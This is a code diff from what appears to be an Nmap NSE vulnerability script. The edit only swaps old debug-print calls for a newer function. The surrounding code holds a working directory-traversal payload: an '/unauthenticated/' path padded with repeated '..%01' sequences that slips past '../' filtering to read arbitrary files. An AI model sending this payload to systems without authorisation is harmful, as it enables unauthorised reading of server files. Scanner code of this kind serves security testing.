@@ -67,14 +67,14 @@ to bypass the removal of "../" directory traversal sequences.
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
   local url = "/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01" .. file_var
 
-  stdnse.print_debug(1, "Getting " .. file_var) 
+  stdnse.debug1("Getting " .. file_var) 
 
   local detection_session = http.get(host, port, url)
 
-  stdnse.print_debug(1, "Status code:"..detection_session.status)
+  stdnse.debug1("Status code:"..detection_session.status)
   if detection_session and detection_session.status == 200 then
     vuln.state = vulns.STATE.EXPLOIT
-    stdnse.print_debug(1, detection_session.body)
+    stdnse.debug1(detection_session.body)
     return vuln_report:make_output(detection_session.body)
   end
 end
